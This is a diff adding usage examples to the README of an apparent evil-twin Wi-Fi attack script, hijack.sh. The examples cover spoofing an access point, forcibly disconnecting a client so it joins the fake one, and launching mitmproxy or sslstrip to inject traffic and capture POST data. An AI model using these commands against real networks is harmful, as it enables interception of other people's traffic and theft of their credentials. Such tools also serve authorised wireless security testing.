@@ -33,3 +33,50 @@ Options:
 - --mitmproxy: Launch mitmproxy to monitor and inject HTTP traffic
 - --sslstrip: Launch ssltrip to downgrade HTTPS to HTTP (when possible) and log POST requests
 - --cleanup: Remove configuration files and shut down services (to recover after an interruption)
+
+Examples:
+
+- Automatically scan for access points, prompt to choose which one to spoof, and ask for a passphrase if necessary (default use). Internet connection is on eth0 and evil twin is set up on wlan0.
+```
+./hijack.sh
+```
+- Auto scan and prompt, but use wlan0 for internet and wlan1 for evil twin.
+```
+./hijack.sh -w wlan0 -l wlan1
+```
+- Auto scan and prompt, but use an assigned MAC address on the evil twin instead of a random one.
+```
+./hijack.sh -m 00:de:ad:be:ef:00
+```
+- Scan longer, to discover access points that may be weaker or further away.
+```
+./hijack.sh -r 3
+```
+- Use a known SSID and passphrase.
+```
+./hijack.sh -s "My WiFi" -p secret
+```
+- Skip the scan, just use the known AP (a scan must have run previously for this to work).
+```
+./hijack.sh -s "My WiFi" -p secret -r 0
+```
+- Use a known AP and force a client to disconnect, increasing the chances they will connect to the evil twin. You must know the MAC address of the client - use airodump-ng for recon in advance.
+```
+./hijack.sh -s "My WiFi" -p secret -d 01:23:45:67:89:ab
+```
+- Use a known AP, and automatically start wireshark to monitor traffic.
+```
+./hijack.sh -s "My WiFi" -p secret --wireshark
+```
+- Use a known AP, and automatically start mitmproxy to manipulate HTTP traffic.
+```
+./hijack.sh -s "My WiFi" -p secret --mitmproxy
+```
+- Use a known AP, and automatically start sslstrip to try intercepting encrypted posts.
+```
+./hijack.sh -s "My WiFi" -p secret --sslstrip
+```
+- Oops, the script crashed or something went wrong. How do I get back to square one?
+```
+./hijack.sh --cleanup
+```
